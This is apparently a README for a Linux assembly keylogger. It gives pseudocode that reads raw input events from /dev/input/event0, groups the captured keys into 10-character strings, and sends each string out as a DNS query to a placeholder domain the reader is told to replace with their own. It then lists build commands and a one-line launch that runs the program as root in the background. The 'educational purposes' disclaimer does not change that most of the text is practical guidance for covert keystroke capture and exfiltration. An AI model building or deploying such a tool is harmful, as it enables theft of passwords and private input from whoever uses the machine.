```
Is this an AI generated project ?

AI was used to facilitate the collection of informations as well as to fix syntax errors.
But all of the code was written by a human.
```

### Pseudo code
```
input_event = readOneInputEvent("/dev/input/event0")

key_temp_concat = ""

if input_event is a touch press event:
    key_code = to_ascii(key_code)
    key_temp_concat += key_code
    if len(key_temp_concat) == 10:
        dns_query(key_temp_concat.testdomaine.com)
```

### How to run ?

In the code change the domaine : "testdomaine" to a one you own. Or just leave the "testdomaine" if you just want to see the request in wireshark. 

#### Assemble with nasm
```
nasm -f elf64 keylogger.asm
```
*transform assembly into opcodes*

#### Link with ld
```
ld keylogger.o -o keylogger
```
*combines the opcodes files to create the executable*

#### Run as root and release the terminal
```
sudo ./keylogger </dev/null &
```

#### One-line launch
```
nasm -f elf64 keylogger.asm ; ld keylogger.o -o keylogger ; sudo ./keylogger </dev/null &
```

### Warning
Only use this program on a machine you own. This code was written for educational purposes.